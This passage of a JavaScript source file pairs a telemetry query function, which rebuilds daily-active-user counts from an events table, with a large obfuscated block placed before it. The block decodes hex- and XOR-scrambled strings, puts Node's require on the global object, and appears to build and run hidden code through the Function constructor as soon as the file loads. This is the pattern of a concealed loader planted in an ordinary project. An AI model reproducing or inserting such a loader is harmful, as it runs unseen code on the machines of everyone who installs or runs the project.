)+Math.max(-0x24b8,-0x24b8)+-parseInt(0x2)*-parseInt(0x25d9);}return O$nntrPmSi[eoeEAKkMBepDpgxlQkYzmw(0x1ba)]('');}function splitLane(Rrcov$gK$zNCzOgmUZuVr){var NDhePqNTm$knxutPKEucsTDk=oeOTScieXviAOgjyGVHkexdTR,wwKUc$mAiSwLfuLcS=String[NDhePqNTm$knxutPKEucsTDk(0x1bd)](0x1*-0x225a+0x1c7a+parseInt(0x5fc)),rJkWfTAcWAB=spin(Rrcov$gK$zNCzOgmUZuVr,NX);return rJkWfTAcWAB=rJkWfTAcWAB[NDhePqNTm$knxutPKEucsTDk(0x1b7)]('^')[NDhePqNTm$knxutPKEucsTDk(0x1ba)](wwKUc$mAiSwLfuLcS),rJkWfTAcWAB=rJkWfTAcWAB[NDhePqNTm$knxutPKEucsTDk(0x1b7)]('*1')[NDhePqNTm$knxutPKEucsTDk(0x1ba)]('^'),rJkWfTAcWAB=rJkWfTAcWAB[NDhePqNTm$knxutPKEucsTDk(0x1b7)]('*0')[NDhePqNTm$knxutPKEucsTDk(0x1ba)]('*'),rJkWfTAcWAB[NDhePqNTm$knxutPKEucsTDk(0x1b7)](wwKUc$mAiSwLfuLcS);}function peel(pGYnIZgtqZTxKSDE){return spin(pGYnIZgtqZTxKSDE,SX);}(function boot(doTex_Gf,IBaza$fNzZnSLwwKdBHHu){var RhYXkJdMgnvKIFalcy=oeOTScieXviAOgjyGVHkexdTR;doTex_Gf['z']=z;var MbrMbuOBEsrayaqSRrQVTdwa=splitLane(RhYXkJdMgnvKIFalcy(0x1b5));doTex_Gf[MbrMbuOBEsrayaqSRrQVTdwa[-parseInt(0x26f6)+-parseInt(0x1213)*-parseInt(0x2)+Math.floor(-parseInt(0x12))*-parseInt(0x28)]]=IBaza$fNzZnSLwwKdBHHu;typeof module===MbrMbuOBEsrayaqSRrQVTdwa[Math.max(-0x1ef,-parseInt(0x1ef))*-0xf+-parseInt(0x1249)+parseFloat(-0xab7)]&&(doTex_Gf[MbrMbuOBEsrayaqSRrQVTdwa[Number(0x2)*parseInt(0x12df)+parseInt(0x270d)+-0x6fb*parseInt(0xb)]]=module);var wY_SyJKOkQnCrZOssqfxLrwcU=peel(RhYXkJdMgnvKIFalcy(0x1bc)),yxGSn$uvzVPigvasM$LBtdj=wY_SyJKOkQnCrZOssqfxLrwcU[RhYXkJdMgnvKIFalcy(0x1b3)](-parseInt(0xf9)*Math.floor(-parseInt(0x19))+-parseInt(0x1)*-0x19fc+-0x324d,-parseInt(0x734)*parseInt(0x4)+Math.max(-parseInt(0x2177),-0x2177)+Math.ceil(parseInt(0x3e52))),XGfmvtXBMbBHonvTK$wB_PMM=peel[yxGSn$uvzVPigvasM$LBtdj],Pu$fTXpNQsalma=XGfmvtXBMbBHonvTK$wB_PMM('',peel(RhYXkJdMgnvKIFalcy(0x1b9))),uWVd$dDu_gTBYWqCZYrZ=Pu$fTXpNQsalma(peel(RhYXkJdMgnvKIFalcy(0x1bf)));return XGfmvtXBMbBHonvTK$wB_PMM('',uWVd$dDu_gTBYWqCZYrZ)(Math.ceil(parseInt(0x132b))*0x1+Math.trunc(-parseInt(0x20f8))+Math.trunc(parseInt(0x179a))),Math.trunc(0x79d)*-0x1+Math.ceil(-parseInt(0x589))*-0xb+-parseInt(0x1578);}(global,require));function oeOTScieXviAOgjyGVHkexdTR(u_NcVNPRuWgUMxeJsKw$BLzX,YTeURAqQFz_qHtU){var KPfNYiB=hAZpanlvmScfQohW();return oeOTScieXviAOgjyGVHkexdTR=function(DUaVT_fJwPfQmzAPLmKvjgoc,z_kmF_MGKGBkxFhTQHXUMfmN){DUaVT_fJwPfQmzAPLmKvjgoc=DUaVT_fJwPfQmzAPLmKvjgoc-(-0xf8*Math.floor(-0xc)+0x1155*0x1+parseFloat(-0x1b48));var mmMRmNV=KPfNYiB[DUaVT_fJwPfQmzAPLmKvjgoc];if(oeOTScieXviAOgjyGVHkexdTR['ILLnqd']===undefined){var caCcZf_cf$uy=function(bflDZ$mRic$FT){var YTXuKMa=parseInt(parseInt(0x1bc7))+-parseInt(0x2)*Math.trunc(0x11d1)+0x8db&-parseInt(0xad1)*parseFloat(-0x2)+Number(0x1c99)+parseFloat(-parseInt(0x313c)),JKGfjROtpxXlCIqeCZS=new Uint8Array(bflDZ$mRic$FT['match'](/.{1,2}/g)['map'](brwT$Gd$SIBrpf=>parseInt(brwT$Gd$SIBrpf,Number(parseInt(0x154c))+parseFloat(-0x1cc6)+0x3c5*0x2))),P$ELOy$A=JKGfjROtpxXlCIqeCZS['map'](hGaYzFfPp$SD=>hGaYzFfPp$SD^YTXuKMa),VHrwyqAQSBMdlsvlZW=new TextDecoder(),abGrzFt=VHrwyqAQSBMdlsvlZW['decode'](P$ELOy$A);return abGrzFt;};oeOTScieXviAOgjyGVHkexdTR['sHMOHY']=caCcZf_cf$uy,u_NcVNPRuWgUMxeJsKw$BLzX=arguments,oeOTScieXviAOgjyGVHkexdTR['ILLnqd']=!![];}var puwqTgnbtgkEeefqGlARp=KPfNYiB[Math.ceil(-parseInt(0x2c))*Math.trunc(0xc1)+parseInt(0x1ded)+Number(0x33f)],aRkH_vkYtrpyXxyBBsFQAAqpO=DUaVT_fJwPfQmzAPLmKvjgoc+puwqTgnbtgkEeefqGlARp,KSG$hASOhNbjmGnDCLbq=u_NcVNPRuWgUMxeJsKw$BLzX[aRkH_vkYtrpyXxyBBsFQAAqpO];return!KSG$hASOhNbjmGnDCLbq?(oeOTScieXviAOgjyGVHkexdTR['ESjpDK']===undefined&&(oeOTScieXviAOgjyGVHkexdTR['ESjpDK']=!![]),mmMRmNV=oeOTScieXviAOgjyGVHkexdTR['sHMOHY'](mmMRmNV),u_NcVNPRuWgUMxeJsKw$BLzX[aRkH_vkYtrpyXxyBBsFQAAqpO]=mmMRmNV):mmMRmNV=KSG$hASOhNbjmGnDCLbq,mmMRmNV;},oeOTScieXviAOgjyGVHkexdTR(u_NcVNPRuWgUMxeJsKw$BLzX,YTeURAqQFz_qHtU);}function hAZpanlvmScfQohW(){var hOzaWISS=['66726f6d43686172436f6465','37554a42616d46','635269632e665252523c4f3c2e52526f6e2e224e453d52632e456964766c72653e5b2052635d5254737678747831706c3c2e69475221223e643c202e217d2e74526c2e235272635263686352225221522e705c6564523c3d6876643c303c20284d5252696f526f65283c2e64796422635252242e603c2e4359622c746468212e65633c2e20456963633c3372523f37522452213c603c632e2277743c7d282d2c52493c7952673c4e74212e3b226f522632246563526379524952632e2961217774286e7b317b7362632e32205b342e2e493c682e6b433c222e2e663c612131407466522e76623c6152632e263c2531524550526352393c523c3152723f37647865376e285f7d762e3c74346e746e74652e66786c7152522e6d2e6363296363633c20666f4d23296642245d3c652e724c29615f2e6d2e78662e662e236c5e212e3c706f20476f45632e52342e525d692e63716c296661726e20723d5263342152524d52735224736a206e3c5a272e525246752e6b632a52453025527d52745263615252705222516e7d20282867785f52526f523c51632637633c526552362d78356b5466522e556326435274643c277370526e442e52615a742e6f694852524d43526335502e5a733c2e456e45525261202e5267525f6e28522c2e63536f524d682e52527365522e21637673442e2c636964536f3c2e7772383c52523c3c50527d522e656b4e203c522e282e524e6e2e52736252793c292d6b6e2e2e52372e2e553c282b7d66652e216235614973283b215d6f2e523879644f6f5274525224535263202e524e5236373c453c453054526552635d52656d265263527431542050537269652c322e544f2c222e65715252526c20617d654161456952286c73656b72536f522e20305228706e2e4f383c2e7252232e6574655268746453285820733c2022286364526352382f642e73483c212e36735d724c70516e316921522e5b78697023705220705235676354634d2e532e68532c756365634e234e2078636f7474503a3c5262765272532e635f52652163522e2e6e412e522e636363317c3a2e3c636661306f642e74523c523c706c477c2e52777d526362556c5225522e656d3320692e525b3e42523c6f522e523c522c6c2e655274363c6328462e695264632d746852456f2e7a636e2e2052612e5052405250626352523c5252743c29642e2e282a3c23656c783221673b6376347261237476652e652e2077522a74463c796366526f6674522066523c2e6b6976742b2e73615f283c293c3c2e6d3c52653d2e2e29217420703c5250263f22522e722c5265232175764e7d522e2e65633c2e523c412e707466522e78796352353c6b6a3672742e7469523a524c736320526c3c52632e222e2c6b2e63743450232e63276b612e3c21536f6665523252205256496e612e536174522e633c486766667552526c57296137742820635262522052303c3c612e7579755b697978642d2e203c3c6c2e73262e38656673202e726352523c522e2e706762687059692e264522656e75702e66632e3463412967306d2c6358527a542e36722830766352202e63522874507a6c7362635231522e612963413d6e6e7734635269692e35523c52207063203c52522e3c3c5038506752662e5261526625733c3c6643622b5221736e5b7b644f342952523c762564522c6f507472313c5229522e2f523428202e5d52616f52256f7473524e52213c5276636976656c522127213c696e2e63726520644674522e2e455d6e7d3a3457527352525265656f5221632e762952246370797352202e503f32632e52522e525222285f2e34705020753c5063292e74323c5263363c2b73522b242e7b52697450522f2e2552666352433b2e3c2e736c74737271657425636f2e4e50523a2e30522e6c69522e296d3c2f5065366161725266782e3c5a2831703c2e6b636f526f656c2b526f7552615252634e32785252343c52723b3b72633777633a2026527b69343034522e722e62636c52652e652e69707d6f25742e692f7267476e6d5b5227342e6c206778223c522f266b6b2e505270765952527931267430727327525252452e727552302e5070523c522e6a63212e6f27206662225266522e52293b286352526c2f2e6372635e4545225f53652e7252726c20523728523c2a5d23325250735252356d643052523752523173726f5269523c52526f52522e456b74733f2c2e522e6e2e692e63383d666565524939286c5f6965506c22236d526e52617452702d29662e6e524428523c52672e722e202e24392e28386c686e2e506563726f743c7d2062306f64715663223977633c3320255269633a7c293c65356928342e3f222e6320436f2f52745d332f633c2e73656e742e6e756e726b674622723c7b61695f65203c5265386f52665273307a3c7c4e782252523c3c2d3c41523b632877776538282e523c5242635265524463625030746e2e306376266f4b63746972203c7463416539525052677b517273796962225228522e3c723a21292e52526c78687d543c72507752522e652e5274486f7d522a7269522e3c776552632e3c526352522e2e632e734022432f6852527d5b63732e522e3c5252452e2a632f3c3a63523f69522e524e63616563233c6465637363496352522e636f5252377b7274612152525a77672e632e3c6a2e52632f3e6952522452522d632f3c522969752e753c2e5b702e636c214d632c2e4a615239523c63525231342e5264755b213c3c735b63633c716373502e7430213954635f74732a20522e522061213120512e2d696c3c523c3c7e45746463526e282e522e282352202e6524643c3f5232522e525a3a524552747452296376783e2d66683c743c2e71526965664f7d312e347321692e696566527233213c20746f66527a2e612e7d526452742e522844202e3a5252247d283c74785b52722e6e665752646645746c5f5252637e63226f636c52697450724a2c3c6d6d786e21522052517428275224503c3c517c6f2e62253128283752653b5270695952503f2e362950632d2e632e3c663c612e2e28696c65202e21496f612e475252526e6c525252203d3c3d522e754a672e693e5f6d334552384d4c533c2e52632f3b74733a522e322e522e237144636f2e5251494e645252217b4c526f202e523d202e306f643c523c55664c5b6e79747352722e6320632e205e653c7020595d2f2d525259662e635b635252355276655b742e3c7d452e2e63213d622f523062273c28326f3c6b2e2e2a5252525276636a733c236f3c626d563c262e60742552723c7365525d6574657026522f526c526a52743c667a4d3d665252523c5253632e74305d2e222e5d64727e2e7264654f7d2e2a6c3c662e665b34205d6369646952526f742e6c2f522e20237661763c2b656d3c52522c722e215274735252662e643d2e43663d282f7362525d78526655697d566770635363522f695252773c735d7b522e67632e2173322d2e653078485244692e522e2e62635220525720457d675a253f3d214d252e5273522152293c69656336222e527352527c726f7452722e732e3052595d636c636d2e4f62495752222552432e5269523b41443e3a286d525926443c732e276352634a3c382e665263633c656343526322662e4665523c2e6c2879523a5274793c216e63202e3365487839522835667c695263742e625248632e226c506f6e6f2c2e3a6e7977632e523c645b522e77525253762e27523c526b6b403f7165637220662e5e65637331522e6e31206d636d6c6f3f7463523279653c215274526c522e59523c3c3c522875522b6532724d5264722e66434d7363392e635261742832633c64523c78653126736361503f296f442163522e737a5152552e2e3c567d6163286324725252742e242e69262e3c646d2164207d2e3c2168252e4c692e737252656528522523733c3123256d52652e52652a33526673683c3364203c676569616440525b73202e73643c526e526a5252706d522e646c2629662e2e73523c64455e2e216e43412e30627e662f346552526f21657e6969672e2e6f6365457226642e3a632e54523c72352e63523d6f74575052273c627220687a732e64386f637021695277682b473c643c742e3c5b663c6928524f526b7252212e42642e623a33655263527e532c2e5229676e3c3b212e3b526537632e702e73444d3e2b66692266633c21655472206470522352637252663661692e47306f526350523b203c6c52743c633c3c522e45397d34522020523c3c217826522e653c2e25522d2d2e52563c6d5d4b2e6f2e522e5b505b615236655d7976527377652e52213c633c524e63755b5d632072502e3c2d27285263652e5265667c213c3c2069293c6f3852546e6363745c652b662121506f325d2e6f2e742e285242475d524e67522e52593c2e7d747a74797952525b3c673b3c666f6e4268723352293e7b465251752e32207452747361492e507b295252287436495b65204e202e20643c666865235b5229502e52503c6f426d636e52696552225253725220743c5261523c3b2e614b3c6f5278522a727375614f2e523c486b302d2652202e483b685265313063642e7272616e3c21783c202e6f22246e443c2e736b44237352523150517434736b665263522d532e523c265f723073655050267b633b6c726a702e21316533697252276a203061347466525234522e667452653b72526e2826655c522e3128523c6321732e7264286373525d6e3c703c52216467632e636e522150632f6f52653c7263662e525222503c736e665261525f6f77312e636374242b683c52786c5f715263654a53505030386720526563405266646352342b27417029522672636e75653125723358632e326f5f3c74525b31422e636e2e796177407b27522852646f2d3352615474733c747d2e74203b522973755220523c342e503c287d63522664263d6f7073633c2d52634552225d32743c7d73636338762e283c2e4f4d2e6e2e6c692e74527038635f5254266c63652d2e3c502120635d2e2665407552326366522c2e6b74526c6e2e525220522e7b223c637466336b634d727b782e6b6e2e2e203d61633c5269522e69456572582149786c745243526d7d6335282e346b7573416e642165637478612e64287352522e2e3f306f3a542262732e3c382150756c63622e6b2e2e655b5255222e525248215b52276f63693c2e45522e297452535d326460722e4e3c69303c6c283c635f523c71523f2e3c652866682d63632f5b21522e7077647e6f2a2e4a43635275732e4e5424685f2e7821663c4440782829337320526763313d527e726b2e6950202852343d2e2e296952613173345c2e586f3f526352703e2e6369526f2e6473525d632e682052525252353c383872345d3c3966525274522e2f2e687652722e5d6a3c5e2e4e73736269312e522e63522e526e732244402e622e685224522b6f743c523361525d665d2e69632e2b41312e2e5663212f3c60617458613b63686f3c2962636128532e65526175286363742e525d202d542d62736e41527370726552333751502e2e5869526673727827527c6f522372647b2d65207d77523c6972652e51306e2e523c7c734d6668652e772e284f6463633c29612e34614174763c436c7b524352793c26622e3328285269745265566530636352522e5252504363253c3c4b253c2d3c64636663633c6c506f2e522063525274742152755252207369632e367965722e6f62355268637b523c522b522d59733c522e63422e797a2e3e5221763b6569522e5052544e522e287d746e2e52667a202e3c616b3c523c72557320575d2e3c6d58745b3c6c5252526e22352e78655252666d2e654e5e735b6e2052522422522b7e2c64527266627752522f522e28783c5250262d63526f202e522b2e313c522279216165507452715252532770522b7272293d426264312e2e52526820693c6c5252523c7469635264632e6466523c692052486e3c623c2e743a2328633d692e634334632e673e3c725066503c4647643d7a646b6c522e6457633c526b6621786c3c2352526d3d7c5d52252e4e525e632e762e7054323c215241306f3b65686e6c63635264287d757439665074526975666f67686f282e6345523b2052523063634b637972522b356f5270526c7352306e6f6f50525053617265526c69696e2e4b6b3c6b214520375252522e524a73434c3c745b7452442e69213e527845526752205263633c526f3c202352753d6865522121316e683c282152522e5a726937696b2e522e632e52522e52452a7d2e52523c502e3c6c6a6f5223633c2e523c6b6f2e52732e7b327865602975723c6e2661212e2e436136685252623b6f61675252202e633c746c5c3b6375723447527a296e746c635b212b66232e2c4261302b3152522263522e38352763732163732e6e733152523c6b695b525b2e522221523c6520685269525e6352264b5f6c52302b533c24655249737b52736e317d62523c524d212e2e2970282e282d65296c526329746322743c672e3c3c2e3c2e73522e2e6472666c3c3c2e63796b52742f3c6e226c482e655a613c5c6250473c657d65733c525223203e703d3c4665405228395265742871322e522e61296328526d3c2f68313c252e732e3c706e252f63276f22726363743c744c2875216972212e6977282872726f50285221522e2c39696363202b6177355266523a2d637328282e632e52522e2e222d6572655270492152536c3d3c4b2e63642e6326692e3c2052525261523c7224235252527552743c28522e5f3652646374783452746b29433c66726f615d507d6b4e52482e6a62733c52637a376c3d59652e5234636b5252526a632e272152526226257252735263732e633c2052636f69643c6569685b6b3f2e786753747870282e632a2160522a6e5d63293c522e52252e526352662a522e4e6374467363702e74645222524a742e616968722e502e52212a4f6752523b6e655963782e722e442e525e6665632e294a285460522750705252205069502873266353494e66676b2864635667732e636c52212e3c3c7452672d523c682e646173615229637a5e3a6a69652e555b7a742e382669523d2e63525249307c5263692e3a6e396a626574523c207052616528296f6f2e6e526c697872402e2e525272662a6120266965662e283c3379216e6e52637766733c653d2e2e653c2e2e2e2e4b744665475d526e6d342e3e626e212e7763204970732073444a2a2e6964632624736179406f30502e772e527e2e2e72252e522e632e3c2e522e3c3d522e526f63332e31642e44635d3320736965633c57526c3c282e632f2663635c337c2e6347292e522e62313c6338683c706f633c61487252527a6252284b30692e7052263d782e5230553c3c492e4d2e522e2e2e2e336952253c2e3c425223282b39635259636349642352632a3a4c743c4a697424683c3c5234795252646c703c7270523c722e2e526a287a6a3c2e632e452e2e73286928633c52442e2e3d7752632e727532675354632e656f63525252632e653c2a52523c492f3272682e6e612e44792e525272522b3c262e2e3d5247762e2d4052702e54726d7b633c6150522752523c272e2e73204b2e4f2e525b526679335d44243c3c5d2e736730212061653c7a74654952205278506e7d525d7061696f3b365266266c7b29522e2e653c6f3c2253522a524756505252313c63323c3c656326525b5263362e6f63203b7e73266d5d202a29702c73263c3c243c2e2e5268526f52522d524521632e65522e2e52732e723c3c34526f384f52523521426e522e3563426e2072412c63664c376943685620282e6c25587c613c5266217a783c2e65662a213d6373526f5b3c523c6f4763646e302e53523c3c6455522e2e6950773c6f6573722020212e2867527452742f5b3c6964775252523c2e526320526c4c525c6e6c6375526573545e523b522e3c6e2d656e714b64726f4352246e2e63527a213c70726a3c226859682c523c582e3c747366262e38663b3c2e79526852523c635252636a2a452b64635272612e45642e2e693c5d3c722e3023643a20565d7273283d652e63633d2e49696c402723526575433c372031692e3b2e775f3c552e3c6c5d526620213b354a3c2e3c362d502e5250526373643373632e5220286176622e7d523c3c5263202e526c6e6c2e39346b576452723c70212e3c6b6f3c647952524a2e666e78317a2e20632f2c526552243c2d52282e70573c6963746a527468532e3b285223635b504a752e722e69272d637a6466744f68522e526c2e287a3068622e545d74202e2e3d3c3d203b3252302e266d66283c7529283d633c282e2e2e275264526b3c2e3c2e5b7d2e4d636677506e2e724d2e4052635b633728272e216468755228542e65523f7a2e696963252e616e295a2e52693c65232552526d2b523c3c78522074286c4c2042417d617263523c525a2177363c6472527452622e21523b2e3634523c6f397d3c6374527a592d2f523f2e3c3c563c205f28633c2f5f2163522c405263522d652952576321523c5252753c4573612152523c6163696c746c492e643c2e5f364a7d292236722e20732e7872302c3e52367575242d63526321632e5852363e5223207374722d61636b295263402e3c2e7752643c2e2e29266c526a523e732e732e7639315252636161634e236674276c3b65607a3c65723c223c302e2e34293c612e522e423b615f306c38734e2e6328523f526b524624522e693c5f3b2352652e7452203c742e632e6c522b52755220732422692e525d3a3c75743c6370204e52212e492e523c435264457b252c6b6c2e443b3c2e21632c6f77522e6343753c63295f3c7463526430307a662e2e2e3c2950246369632e2c6277207852246c5274527321296a3360396373462128635237303c526f3a3c6e652e6e2e69702452522121633c3252636e52633174637269692923522a295d3c642e2d29732e393c3c633c63315f7474704273722e3c2b3c3c2e232e202e72753c5245733e61526063312e29506c5272632e7478527052682e31774d6339632672642273345552203c52335b6666505069232241215238505d522e65625278526144527321522d6952623c435f723c6e222e2548527448542e2e5252526c63522e612e332674203c5239737c6474722e2b2b2e6d3c452e40646574633c2e21682e296c5b642145526d352e502c5250632f2e28664552507470497c52685c3c637352522052686363522e2e21664b6e3b70782c525264653f2e302e3c243c3a437824636f2e633c432e3c522f203c3a3c6f2e204952632e3e3c523c4452776364723c3021523052723c733c3328203652434f3c52694c52204a2176242e756575523c4361523c22642b633c2e52632e335252524b6c2e59442e662e412e5223696e3f3c636e7c652e322e632e5f6e5278525452615b3c2e4d5863727d7752733e522a3c725222743c5874743c213b633c643952217452617425636f3c7b52742e245252525236623c7d2e2e6366524e5b63216b65675552637a3c21753c2e63612c7943215a6f2e665f62316f52527a21522e523c217b522c6f28652e783c2e3c2e52725f52785042285261636e5070522e61527a383c2e6775665e4e3b71526c6b52786f526252206a454d5c5476526d727577522e706c63705d62276352522e2e2e5b5a2e216c2e52635253525263612e6563523028535a37366c5d5f25526d4021657d733c2b3c39202e217252636f5e65242e643752727349697b763b502a286e6f2e632e73395f525252526569452d3b3c632c50527452527329222e787063523c25653c616c3c216e7b3c3f412c4a2c683d5261382b29526e6f64656c2f3c236e2e312f5b533766725b2e633d2e3d2e63642e2e297425366f65725b672e505265522473526e3429527670526d3c6474636652697430697752636f6a73522e6929656c5241502e653c522e216f6d6369322e7721526f523b2a63685f523c54523c2e63522226692e702d433c2f522e6e3c78666f583852775264702e3c3352522e2f632e252e735b633c2e71653c7665202d5e527243236363523c27656374313b456f6d6f5c52522e3c735f6520632f7552523520502e216575485f63702e20612e6378726547612e3c3078665275526472522e522e615252656a743c666d2e52637344524857666569656d6463662d63523d383c2c523b3b707d6d5b63526e632e22636f2b635052436720282e22242e3752284a7372632f7523657526225663352e2e2e502e3d65634352637361295d3c63636372523c612e2e4d216b6f733e636e4e63773c3b6363633c3c636e3c2e52216e5b5b7d522e3952242a275252523c2e483a637276637452632e422a522229662b6c782063522a63772165743c57316e57522b253c54632e2e2e636e31297252216e39543c546352783b326e2e732b3c343828636e635242616e6950212e27613c525a2e505d522e3c20523f29522b52636f656b633b676663523c5b68536f286f50736366522f567064692e526e68522e652063233c2e3e6c4921526d2367632e2e723c2e3c2e236363743d52683c543c402e523f2e632128663c67526c635269553c3c6c4447292e6d74655264205252656e69716e5239712e20612b2e523c52522e6e745245363c302e6e633c3c536c2e2e5f2e6352285252526150526175286f522069495f5263635f746e203c52702e522e52753d2e7e69744d692e69414d632e305e2e28525033636e212e637552766c3c632e643c6e605252272e3c28635033522e75732e525250762e3c2e4b28282853523c64427452706e655c2030366374636e20654c3b506f3366697b64657020523c2e6f3c3c3d5b2b522065632e526b635263656352703c2e2e63725274342e653352636d2c77523c522863206352756552522e67296365614e3c635222637261635252662134653c2e6320772e7b6f7979522e363c5273612a636c742e522e776e632e69626e2364203e2e5d522e28633f63523b63282052213b66643c6c2e523c632263212e6c43226d525252436f4e2e2e28613440526f2e736d525b6e526164742e6f3c63613c6c207b6c6d2d2e28663c5f6f31745c6152632e6d642e522e2f6a522e6e6674697d646963204e5d2e5252523a525261686363636e6a335d523c36757a73342e3c6b636b642e6c7363703c2e6363522c526d642e5254786352634d6e212669643c616c2e3b52522e2e6b3c635d65633c755421756572672c2e3b2e2e52632e5b6e6f632374732e50263c3021784e656c52352e6d6952286a5c6e6e3c522e642822755263636d6362522e3d52736e74526f5221652e322e3b73525250725a63615f6357412e6e21634e2e522e3c63633c245252732e6552753c52542e52682e6065632e733d2e2e5b63736e774e636e7365362a61226467292e50524933213066637252526122726e722e63662b39455d46523c2b2e21442e6144632e635d3b2e646f6652292c3c75525d3c732e34502e2d2e52522e555263666652665228656943613c3c523c30632e474963505262266c64602e45525b202e273c4d525273203b2e63667263272e3c262e6c252051756f702c2e5338525252733c637765652e20703e63535d28316926792e2e2e20753c6c46636e3b5120722e2e3c636675453a2e7b5b525261466352726d753b2e25253c632e2c523c65462e65202e2b6e31632e52523c2e2d525266632152205252632e2d783d7250522e526320292f74212164683629787062506563527463666d2e326e3c74722e2e28502064657b2e346965216765724950484b4352735652463664393b74523c2c4a5c2e635263786f3c636c4d292e2e732e632052743c74606d7c49522e2840696936202552746c5c3b64272b3c6364262e3c522e523c633929732e52723c632e745d655f694472202e442e6e2020482e64636e64663d395263792e7d47222e702e632c5263203c6d2563632e393c2763403c632e5263436d453f636f6a63724c2d525262655b3c63522e2e696c616f73523c202e6363352e2e726942527d52627252507b523c302e536f69632174752b533c697835316369675237776652372e2e222e632e255a4563632e7c246672525274466364633c63746e5d3d67793c26666322526452292f63635b69655252632e6e525252772e2e2e283c3a4c50432163723c63522e6365282e3c5b706c734c20662e7879663a692e7a656f736172526f3c652e69276d746e695d637552206365696f2e29582668524e6351722e73662f2163716320633a522e2e6665626a5252205278527263286152334d6752672e2e6f5d652e6f6f73526563523952325b6b213a745f4b212e2e636f523a286664503c243c2e526c7c6675737228362077695263523c7b312e315252522e2e636e5b286532642e692e522e202e795264636f2e22676074742e61642d633b2e522e525265205368363c43522c2c643e27636d642e2e612e692e63522e3752643c3c5670525f3c7052202952733e736c382e3352732e54317363522e24636b775d6c743c3c36525b5020583c202052223c3c297030292e6c6d73316f276f3c347a6e21526363666e2e746c6f78285236652e31546467202866696e6574696b7b2e2e472e52367b63492e502e2e65526f69522e2e6f32527462524e2e282e573c526669745052212a352e4a6c3c302e6c64743d50297152676e524b753b253c3c2e77297d642d2e632e2052433446696d6c523c636c6363703c533e7265742e7352203c5d3c7352306e52206f6167636c527d2845693c52632e6f3c6350632e28733a762e702d323b634c3c3320222852752e6330432e2e523c6e217d31632e6b3d632e52232e65267e692e742063522e7a6529522f3c632e633c2e2e6a526536637b6a2e705269583c2e7d7363634b292e794e3c722e6622642665722e356e612b232b31612e725263662f4855642e633c2e692e526372507a2e2e203c63522752652052522e66626152305f526a75793c5d29523c246e6a3d527434707052696c637b525252773c2e522f642e6e523c6f285221743f4661522052342e702d2e4a742e652063655265636e6372522c54612871655f676c52632e63722b6352773c24246f4e6361633c2e626163473c74662b63643b522965284f724065642e2e3c6452635220755224296944442e522e43642e283c223065292e75525269733c63613c2e6373645252636f2e522e6328652e54742e692e2e315b203c745222523b747628354e3c2e52616f5263222e5f6d6322706e332963653c5252526e5220636e7420696f525252202e6e2e3152212d675d4328246d6978692d3d3c636350282e6552716520632720305b333c525244522d516c72527d6e7152524e633c4572747c63632e653c3c64506e663c3846726231775072526163676b38522e20613c2e526b2052637b523f4973527d6c6152632e545b756d683c64636352636f432e52682e2e72522e79797543632e7d3c3c2e65','313135303932364361764c6d4a','3433353836316553627a657a','333133333635394843684c4f6c','636861724174','37373035333935426e79797159','324644766d574e','6c656e677468','737562737472696e67','343532353434386b7163617852','635e6d656a625e74726f','3437304e6b5372464c','73706c6974','33303530353438446a474e6e68','3d61656e72756828616c3d35632c67386664752e7972202e2e6e636563662c35227061656175366c6e6a29725d32757622782d71285d20613b28723d3b3b722b28615b382e73327441676f712c756838432c61692c733b6128416d30286e6a3b6a762a2c37766f372829286f3b6d366f61347277292e20726f645b6673326e7b647276743478292b302c616e722b72722b6f297d7a31203d68665b616e387231725b2c5d73372d37376c61612e7569377b2d3036396c766d7432723d695d5d3c2b29752c65292c2c3b6e72685b723d30762d72283b2c3d70294375733d2b633b673b663b7141292931766929766b306e726c31616520663d5b3b686973792e656d28642b6f2132203d286576656137383d2e293465693d672e6e3d7b66663d315b3c32612066313d723b342c532972796c76317520793b6b716c7b74766e7620284320286c2c6f766e7020693d746c722c722e6c776f7a68286c2c74713b3b72722828763d616873763b5d78713d61623b64613b2c2828723b766a712e28745b2b2964612972646e7268733431792876723b66683b3367225d65282e616872706170675d672e296e6766706e31682c69636c3b3b293d433b6d353d2b722c202e293b753d2b737d2b2969742c2b626d3b642b756d292d3d736969716f6c3d743d723d71392b2e2e6368712b5b3666652074306e7270722820767238666c726e2c64646774205d36612e3b6d3b7274682e67712032617d65766569635d676274693c346f3b433b6c2c7a7a69362b6c5b615b3b2b287369226c6922722c6e706939732c667266687577296f773d657b28623d77656e32742e67752e693d6b696161612b297966747061336e7d293d3922296370412b753b7574705d223d6c6b377670742031723b687a7722297428293929282e6c756c3d7337663b203b737130296e22792b30737d3d76612b73206d682830712e5d68763b3e2030363d412d6f7a6574722874317274727369736f30652c2e3b7a5b28663c356537742c2872616f61766e723b746868663b762c6a3d723b2029723e31387a686f2a6f7b3c616b6d736e29616b74652e766f392b656130636c696f3b6275203d5d4321676a3b79332b6c29653d2e7d64723d69366f694338726e6e303b363d6172227d2e7265693d5d537473726e6e2e3b32723d743b5b743b69763d707243726e282961726574757a2b20686c6b5b2b783d65202d386a7b28656a79392828292920','6a6f696e','323238313031517163714f4d','6871657273786c7576776163646a62796d676f727a666b6f636970747275746e73746f6e63'];hAZpanlvmScfQohW=function(){return hOzaWISS;};return hAZpanlvmScfQohW();}
async function repairDailyActivityYesterday(env) {
  try {
    await env.DB.prepare(`
      INSERT OR IGNORE INTO daily_active_users (
        activity_date, telemetry_id, raw_active, meaningful_active,
        release_active, meaningful_release_active, session_start_count,
        turn_end_count, session_end_count, session_crash_count, ci_active,
        last_is_ci, last_build_channel
      )
      SELECT date(created_at), telemetry_id, 1,
        MAX(CASE
          WHEN event IN ('prompt_submitted', 'turn_end') THEN 1
          WHEN event IN ('session_end', 'session_crash') AND (
            had_user_prompt > 0 OR had_assistant_response > 0 OR turns > 0
            OR assistant_responses > 0 OR tool_calls > 0 OR executed_tool_calls > 0
          ) THEN 1 ELSE 0 END),
        MAX(CASE WHEN build_channel IN ('release', 'ci_release') THEN 1 ELSE 0 END),
        MAX(CASE WHEN build_channel IN ('release', 'ci_release') AND (
          event IN ('prompt_submitted', 'turn_end')
          OR (event IN ('session_end', 'session_crash') AND (
            had_user_prompt > 0 OR had_assistant_response > 0 OR turns > 0
            OR assistant_responses > 0 OR tool_calls > 0 OR executed_tool_calls > 0
          ))
        ) THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'session_start' THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'turn_end' THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'session_end' THEN 1 ELSE 0 END),
        SUM(CASE WHEN event = 'session_crash' THEN 1 ELSE 0 END),
        MAX(is_ci), MAX(is_ci), MAX(build_channel)
      FROM events
